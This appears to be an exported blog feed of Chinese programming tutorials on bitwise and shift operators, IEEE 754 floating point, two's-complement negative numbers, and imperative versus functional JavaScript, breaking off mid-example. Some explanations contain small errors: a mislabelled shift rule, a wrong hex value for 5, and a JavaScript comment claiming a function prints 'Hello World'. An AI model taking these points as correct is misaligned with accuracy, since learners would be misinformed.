<code>unsigned short</code> ， <code>~5</code> 将不再是 <code>-6</code> ，而是 <code>65530</code>**。<br>**还有一个规律是正整数取反后结果是原数加一后取相反数，负数一样</strong>。<br>**还要注意不要和逻辑运算符 <code>!</code> 搞混，<code>! 1 = 0</code> , <code>! 1234 = 0</code> , <code>! 0 = 1</code>**，即只有 <code>真(1)</code> 与<code>假(0)</code> 两种。</p></blockquote><h1 id="六、移位运算"><a href="#六、移位运算" class="headerlink" title="六、移位运算 "></a>六、移位运算 <span id="6"></h1><p>顾名思义，移位即将数据的二进制数进行向左或向右平移一定的位数，然后得到新的数据，移位分为左移位和右移位。</p><h2 id="1、左移位（-lt-lt-）"><a href="#1、左移位（-lt-lt-）" class="headerlink" title="1、左移位（&lt;&lt;）"></a>1、左移位（&lt;&lt;）<span id="6.1"></h2><p>将数据的转换为二进制，所有位向左平移，高位（左端）舍弃，低位（右端）空位补 <code>0</code>，格式为：</p><p><code>需要移位的数据 &lt;&lt; 需要移动的位数</code></p><p>举例：<code>5 &lt;&lt; 2 =20</code> ，运算过程：</p><pre>  00000000 00000000 00000000 00000101   ---> 5 -------------------------------------  00000000 00000000 00000000 00010100   ---> 20</pre><blockquote><p><strong>右移位的数学意义是，原数左移 n 位，相当于原数乘以 2 的 n 次方</strong></p></blockquote><h2 id="2、右移位"><a href="#2、右移位" class="headerlink" title="2、右移位 "></a>2、右移位 <span id="6.2"></h2><p>将数据的二进制所有位向右移位，低位舍弃，高位补 <code>0</code>（负数补 <code>1</code>），格式：</p><p><code>需要移位的数据 &gt;&gt; 需要移动的位数</code></p><p>举例：<code>5 &gt;&gt; 2 = 1</code>，运算过程：</p><pre>  00000000 00000000 00000000 00000101   ---> 5 -------------------------------------  00000000 00000000 00000000 00000001   --->  1</pre><p>负数情况：<code>-6 &gt;&gt; 2 = -2</code>，运算过程：</p><pre>  11111111 11111111 11111111 11111010    ---> -6 -------------------------------------  11111111 11111111 11111111 11111110    ---> -2</pre><blockquote><p><strong>右移位的数学意义是，相当于原数除以 2 的 n 次方</strong></p></blockquote><h1 id="七、复合赋值符"><a href="#七、复合赋值符" class="headerlink" title="七、复合赋值符 "></a>七、复合赋值符 <span id="7"></h1><p>算术运算中有复合赋值符：<code>+= -+ *= /= %=</code>，位运算也有对应的复合赋值：<code>&amp;= |= ^= &gt;&gt;= &lt;&lt;= </code>（注意没有 <code>~=</code> ），运算一样：</p><p><code>a &amp;= b</code> 等价于 <code>a = a &amp; b</code></p><p>以此类推</p><hr><h1 id="返回顶部"><a href="#返回顶部" class="headerlink" title="返回顶部"></a>返回<a href="#home">顶部</a></h1>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 位运算 按位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于浮点数的剪不断理还乱</title>
      <link href="/2024/09/27/bian-cheng/guan-yu-fu-dian-shu-de-jian-bu-duan-li-huan-luan/"/>
      <url>/2024/09/27/bian-cheng/guan-yu-fu-dian-shu-de-jian-bu-duan-li-huan-luan/</url>
      
        <content type="html"><![CDATA[<h1 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h1><p>谈浮点数前，先了解一些基础知识；对于整数的十进制与二进制转换不难，原理也简单就不再赘述，假如现在要进行转换的十进制数字是带有小数点的，转换方法就会稍微有点不一样了；为了使说明更浅显易懂，先来探究一下十进制小数中的奥秘；</p><p>以十进制数 <strong>3.125</strong> 为例，小数点以左为整数部分，右为小数部分，它也可以被更具体的拆解为以下形式：</p><pre class="line-numbers language-none"><code class="language-none">3x10^0 + 1x10^-1 + 2x10^-2 + 5x10^-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这也是十进制数的特点，基数为 10，所以每一位都是与 10 的相应次方的乘积，指数也是有规律的，可以看成以小数点为对称轴，向左就是 10 的 0、1、2、3……次方递增，向右则是 10 的 -1、-2、-3……次方递减，如果换一种形式，那么在运算方面也具有对称性（乘法与除法互为逆运算），就是下面的形式：</p><pre class="line-numbers language-none"><code class="language-none">3x10^0 + 1&#x2F;10 + 2&#x2F;10^2 + 5&#x2F;10^3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样，理解二进制的小数部分就容易了，已经知道整数十进制转二进制其实就是连续除以 2 取余数，那么根据上面的规律，小数部分看出逆运算，就可以总结为 <strong>连续乘 2 取整数</strong>，举例说明：</p><pre class="line-numbers language-none"><code class="language-none">3.125（十进制）3     &#x2F; 2 &#x3D; 1    --&gt; 1         余 1    --&gt; 10.125 x 2 &#x3D; 0.25 --&gt; 00.25  x 2 &#x3D; 0.5  --&gt; 00.5   x 2 &#x3D; 1    --&gt; 1&#x3D;&#x3D;&gt; 11.001（二进制）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>11.001</strong> 就是 3.125 的二进制小数形式，同时它也可以做如下拆解：</p><pre class="line-numbers language-none"><code class="language-none">1x2^1 + 1x2^0 + 0x2^-1 + 0x2^-2 + 0x2^-3&#x3D; 2 + 1 + 0 + 0 + 0.125&#x3D; 3.125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到也是与十进制形式相对应的，只是基数从 10 换成了 2 而已；</p><h1 id="定点数"><a href="#定点数" class="headerlink" title="定点数"></a>定点数</h1><p>当然，都知道机器码都是一堆 <code>0</code> 和 <code>1</code> 组成的数据，并没有小数点这个专门的符号，要表示数字 3125 还好说，但是 3.125 中间多出的这一点要怎么解决呢……一个很直接的方法就是把小数点应该在的位置焊死 -_-，比如 32 位的系统，规定小数点在 16 位和 17 位之间，那么根据 3.125 的二进制是 11.001，在 32 中的表现就是：</p><pre class="line-numbers language-none"><code class="language-none">0000 0000 0000 0011 0010 0000 0000 0000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就是 <strong>定点数</strong> 的规则干的事情，看着挺好，要是多用几次系统空间可能就 hold 不住了，不好之处明显就是花掉当前一半的数量级取表述小数部分，当然可以少划分几位给小数，但对小数好像不太公平，万一精度要求高呢，反过来呢对整数又不公平了，手心手背都是肉，得想办法解决才行；</p><h1 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h1><p>于是乎，浮点数横空出世；其实上述问题平时肯定都遇到过，比如记个帐，昨日净收入 <code>31200000000</code> 元（@_@），肯定不想写这一堆 0 对不对（如果是真的咱愿意写 100 遍……），一般都会写 312 亿或者 <code>3.12x10^10</code> 元，重点就在后面这种科学计数表示法，人为了省力省纸省笔墨弄了个科学计数法，处理器也自然用上了浮点数，省空间；具体原理与表示方法后面会讲；</p><p>以 C语言为代表，其中就有浮点这一数据类型，比如单精度浮点 float（32 位），双精度浮点 double（64 位）等，可能平时也就直接声明和使用较多，没太关注底层实现的算法，其实也不太复杂，套用一种规则而已，下面开始介绍；</p><h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p>目前关于浮点运算与表示，使用广泛的应该就是 IEEE 754（二进制浮点数算术标准）了，其主要内容如下：</p><pre class="line-numbers language-none"><code class="language-none">v &#x3D; (-1)^s * 2^e * mv: 浮点数具体值s: 符号位，即正负号，0 为正，1 为负m: 有效数，也叫尾数，可以类比科学计数法前面的有效数字   另外还有一个小数位 f, m &#x3D; 1 + fe: 指数位，即 2 的多少次方<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该标准包含了多中位数，以 32 位为例：</p><pre class="line-numbers language-none"><code class="language-none">(1)   (8)          (23)          : 位数0 00000011 0010000000000000000000s e        f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>总结就是：</p><ul><li>第一位为符号位 s；</li><li>后 8 位为指数位 e；</li><li>最后 23 位为小数位 f；</li></ul><p>64 位的规则是：</p><ul><li>第一位是符号位 s；</li><li>后 11 位是指数 e；</li><li>最后 52 位是有效数字 m；</li></ul><p>知道了这些还不能立刻套用上面的公式经行转换，还需要了解接下来的一些规定；</p><h2 id="指数偏移值"><a href="#指数偏移值" class="headerlink" title="指数偏移值"></a>指数偏移值</h2><p>浮点的二进制表示中指数位 e 的计算值（即转换成十进制后的值），要在实际指数值（十进制）的基础上加上一个 <strong>偏移值</strong>，标准中规定偏移值为 <code>2^(e-1) - 1</code>，如 32 为中 e 是 8 位，所以偏移值为 127，64 位的就为 1023；所以 32 位指数实际值的范围为 <code>-126 ~ 127</code>；</p><p>举个例，指数 e 的实际值为 -3，那么 32 位中加上偏移值就是 <code>-3 + 127 = 124</code>，换算成二进制的 8 位指数位就是 <code>01111100</code>;</p><p>这种指数位偏移后的指数值，又叫做 <strong>阶码</strong>，因为科学计数法中的指数是有正负之分的，所以实际指数值加上一个正的适中偏移值，就可以使得浮点表示法中的指数位为无符号的整型（就是变成正整数），利于浮点数的比较大小，就是可以直接从浮点的二进制表示中，由高位向低位逐位进行比较（如果是负数二进制比较大小要复杂一点）。</p><h2 id="表示方式"><a href="#表示方式" class="headerlink" title="表示方式"></a>表示方式</h2><p>具体的表示方式会根据不同的情况而不同，主要有以下几种情况；</p><h3 id="规约形式"><a href="#规约形式" class="headerlink" title="规约形式"></a>规约形式</h3><p>即 e 的 8 位数字不是全部为 0 或者 1，此时 <code>m = 1 + f</code>，由于小数部分 f 的值在 0 到 1 之间，所以有效数 m 的值在 1 到 2 之间；</p><h3 id="非规约形式"><a href="#非规约形式" class="headerlink" title="非规约形式"></a>非规约形式</h3><p>这种形式 e 的 8 位全部为 0，小数位 f 值不为 0，用于表示非常接近 0 的数，此时不再是 <code>m = 1 + f</code>，而是 <code>m = f</code>，即 m 值在 0 到 1 之间；实际上所有非规约的浮点数比规约浮点数更接近于 0；</p><h3 id="零值"><a href="#零值" class="headerlink" title="零值"></a>零值</h3><p>指数位 e 全为 0 的同时，小数部分（f）为 0，用来表示 <code>±0</code>（正负取决于 s 位的值）；且规定最小指数位编码（e = 0 时）的实际值应该取 <code>-126</code>（本来应该是 <code>0 - 127 = -127</code>）；</p><h3 id="无穷大"><a href="#无穷大" class="headerlink" title="无穷大"></a>无穷大</h3><p>如果 e 全为 1，且 m 全为 0，则表示无穷大（Infinity，正负取决于 s 位的值）；</p><h3 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h3><p>如果 e 全为 1，且 m 不全为 0，则表示 <code>NaN</code>（Not a Number，非数值类型）；</p><h2 id="综合举例"><a href="#综合举例" class="headerlink" title="综合举例"></a>综合举例</h2><p>后面的例子都以 32 位为例，其它位数根据标准类推；</p><p>先来看一个十进制转浮点，规约形式的例子，比如用之前的十进制数 3.125，转换为 32 位浮点二进制格式（<code>0b</code> 开头的表示二进制数据）：</p><pre class="line-numbers language-none"><code class="language-none">3.125&#x3D; 0b11.001&#x3D; 0b1.1001 x 2^1s &#x3D; 0e &#x3D; 1  &#x3D;&gt; 1 + 127  &#x3D;  128  &#x3D;  0b10000000  m &#x3D; ob1.1001f &#x3D; m - 1  &#x3D; 0b0.1001  &#x3D;&gt; 0b10010000000000000000000  &#x3D;&#x3D;&gt;0 10000000 10010000000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>转换的大致流程总结如下：</p><p><strong>十进制小数 –&gt; 二进制小数 –&gt; 浮点表示法 –&gt; 二进制浮点</strong></p><p>再举一个二进制浮点转十进制小数例子：</p><pre class="line-numbers language-none"><code class="language-none">1 01111111 00100000000000000000000s &#x3D; 1  &#x3D;&gt; -1  e &#x3D; 0b01111111  &#x3D; 127  &#x3D;&gt; 127 - 127  &#x3D; 0  f &#x3D; 0b0.001m &#x3D; 1 + f  &#x3D; 0b1.001  v &#x3D; -1 x 0b1.001 x 2^0  &#x3D; 0b-1.001  &#x3D; -1.125&#x3D;&#x3D;&gt; -1.125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="精度"><a href="#精度" class="headerlink" title="精度"></a>精度</h2><p>以 32 位单精度浮点数为例，由于分配给有效数字的位数是 23 位，而整数部分默认是 1，它的位置就不用留了，所以小数部分就可以独占 23 位，在加上默认的一个整数位就是 24 位了，同理，64 位双精度浮点数的有效数就是 53 位（52+1），再进行一下算术运算：</p><pre class="line-numbers language-none"><code class="language-none">log(2^24) &#x3D; 7.22log(2^53) &#x3D; 15.95<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的算式表示二进制下的这么多位数的实际值，对应到十进制中有多少位；结果表明，单精度浮点可以保证 7 位十进制的有效数字，双精度的则可以保证 15 位；</p><h2 id="“浮”的原因"><a href="#“浮”的原因" class="headerlink" title="“浮”的原因"></a>“浮”的原因</h2><p>取名为浮点，那么到底“浮”在了什么地方，与定点数相比的优势又是什么？总的看来，其实其转换操作很类似于十进制中的科学计数法，而科学计数法的出现，就是为了实现能简短地书写较大的数，比如写作 <code>1.0x10^20</code>，就可以避免在 1 后面写那令人抓狂的 20 个 0 了；</p><p>同理，二进制中如果用定点数表示小数，那么 32 位的话就最多到 32 位有效数字，而用这种类似科学技术的浮点表示法的话，指数能表示到 100 以上，也就是 100 多位了，相信现在的 100 位系统也是稀有物种了吧；因此，浮点数有效的扩大了能表示的数据范围，科学计数法减少了书写量，浮点表示则是节省了存储空间；</p><p>另外也是由于科学计数本身的特性，以及指数偏移值，也就是 <strong>阶码</strong> 的应用，小数点也就不再像之前一样固定，具体位置会根据指数的大小最终“漂浮”到不同的位置，甚至到那遥远的地方……</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浮点 定点 二进制小数 规约 阶码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十进制负数的二进制表示法</title>
      <link href="/2024/09/27/bian-cheng/shi-jin-zhi-fu-shu-de-er-jin-zhi-biao-shi-fa/"/>
      <url>/2024/09/27/bian-cheng/shi-jin-zhi-fu-shu-de-er-jin-zhi-biao-shi-fa/</url>
      
        <content type="html"><![CDATA[<p>十进制转正整数转二进制应该都会，用C语言代码简单表示算法：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> dec<span class="token operator">=</span><span class="token number">65535</span><span class="token punctuation">;</span> <span class="token comment">/*positive decimalism number to binary number*/</span><span class="token keyword">int</span> bin<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> j<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>dec<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>bin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>dec<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">;</span>dec<span class="token operator">/=</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>bin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>dec<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>j<span class="token operator">=</span>i<span class="token punctuation">;</span> j<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token comment">/*print binary number*/</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>bin<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然也有另外一种简单转换方法：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> dec<span class="token operator">=</span><span class="token number">65535</span><span class="token punctuation">;</span><span class="token keyword">char</span> bin<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">itoa</span><span class="token punctuation">(</span>dec<span class="token punctuation">,</span>bin<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/*整型转换为字符串的函数，第一个参数是整型变量，第二个是字符数组，用于存放字符串，第三个是进制，“2” 表示输出的字符串的进制格式，可以这样记函数：“int to arr” */</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> bin<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是，十进制负整数转换为二进制稍微复杂一些，分为三步：</p><h1 id="一、原码"><a href="#一、原码" class="headerlink" title="一、原码"></a>一、原码</h1><p>例如一个十进制数 5，二进制原码表示为：</p><p><code>00000000 00000000 00000000 00000101</code></p><p>大小为 4 字节，每一个 <code>0</code> 或  <code>1</code> 表示一个比特位(bit)，所以八位为一字节，好像32位和64位系统都这样。一字节用十进制整数表示大小则是：2的8次方（256）。<br>表示为十六进制是这样：<code>ff ff ff ff</code>（f=2^4-1）</p><h1 id="二、反码"><a href="#二、反码" class="headerlink" title="二、反码"></a>二、反码</h1><p>将二进制原码每一位取反，就是 <code>0</code> 变 <code>1</code> ，<code>1</code> 变 <code>0</code>。<br>上面 5 的反码表示为这样：</p><p><code>11111111 11111111 11111111 11111010</code></p><h1 id="三、补码"><a href="#三、补码" class="headerlink" title="三、补码"></a>三、补码</h1><p>将反码最低位加 <code>1</code> 叫做补码，那么 5 的补码表示为：</p><p><code>11111111 11111111 11111111 11111011</code></p><p><strong>注意反码末位是 <code>1</code> 时记得进位。</strong></p><p>所以十进制数 <code>-5</code> 的二进制表示为： </p><p><code>11111111 11111111 11111111 11111011</code></p><p>所以 -1 在计算机中表示为全 <code>1</code>，就是：</p><p><code>11111111 11111111 11111111 11111111</code></p><p>我64位计算机中是这样的：</p><p><img src="https://i.loli.net/2018/04/15/5ad3575f46acf.jpg" alt="20180404111248861.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 负数二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程范式之命令式与函数式</title>
      <link href="/2024/09/27/bian-cheng/bian-cheng-fan-shi-zhi-ming-ling-shi-yu-han-shu-shi/"/>
      <url>/2024/09/27/bian-cheng/bian-cheng-fan-shi-zhi-ming-ling-shi-yu-han-shu-shi/</url>
      
        <content type="html"><![CDATA[<p>很多语言是<strong>聚范式/多重范式</strong>编程，即支持多在编程范式，如面向对象(Java)，面向过程(C语言)，泛函(函数式)，元程序设计等；以下例子都用 <strong>JavaScript</strong> 举例；</p><h1 id="命令式编程-Imperative"><a href="#命令式编程-Imperative" class="headerlink" title="命令式编程(Imperative)"></a>命令式编程(Imperative)</h1><p>如命令一般指导程序一步步完成功能，如 for 循环：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        n<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">myFn</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="函数式编程-声明式-Functional-Declarative"><a href="#函数式编程-声明式-Functional-Declarative" class="headerlink" title="函数式编程/声明式(Functional/Declarative)"></a>函数式编程/声明式(Functional/Declarative)</h1><p><strong>函数式编程特点：</strong></p><ul><li>函数式编程是声明式的；</li><li>提倡纯函数理念，变量私有，不同于面向对象编程的成员共享；</li><li>无副作用，不影响其他外部变量；</li><li>有些类似初中数学纯函数f(x)的定义，提供输入值，返回新的输出值，每次提供相同输入值总能返回相同输出值，使线程安全可靠；</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Array<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 纯函数，输出唯一</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 非纯函数，输出不唯一</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>函数的大量使用，变量中存储函数，动态创建函数，返回值为函数，函数作为参数传递，等等；</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 字符串通过函数储存在变量中</span><span class="token keyword">var</span> <span class="token function-variable function">myStr</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">'Hello World'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myStr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Hello World</span><span class="token comment">// 对象属性值储存为函数</span><span class="token keyword">var</span> myObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Cloud'</span><span class="token punctuation">,</span>    <span class="token function-variable function">getName</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myObj<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Cloud</span><span class="token comment">// 动态创建函数，用时调用，用完销毁</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Hello '</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">'World'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Hello World</span><span class="token comment">// 函数作为参数进行传递</span><span class="token keyword">function</span> <span class="token function">paraFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">'Hello'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">myFn</span><span class="token punctuation">(</span><span class="token function">paraFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'World'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Hello World</span><span class="token comment">// 函数作为返回值</span><span class="token keyword">function</span> <span class="token function">myFn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">'Hello '</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> a <span class="token operator">+</span> <span class="token string">'World'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">myFn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Hello World</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>总结：</strong>例如for循环一个数组，命令式便是写出具体循环的方式，声明式便是只写声明函数，只要循环结果，具体方式交给程序执行；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 命令式</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    b<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// [1, 4, 9]</span><span class="token comment">// 声明式</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> a<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> i <span class="token operator">*</span> i<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// [1, 4, 9]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样的结果，<strong>代码量和理解难易</strong>上，声明式都明显优于命令式对吧；</p><p><strong>声明式编程：</strong></p><p>特点：</p><ul><li><p>说明想要实现的功能，让机器完成步骤以及如何实现；</p></li><li><p>免去一些不必要的命令步骤，让思维集中在功能开发上，而不是冗长的复杂过程实现；</p></li></ul><p>递归实现阶乘便是一个典型的函数式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">factorial</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span><span 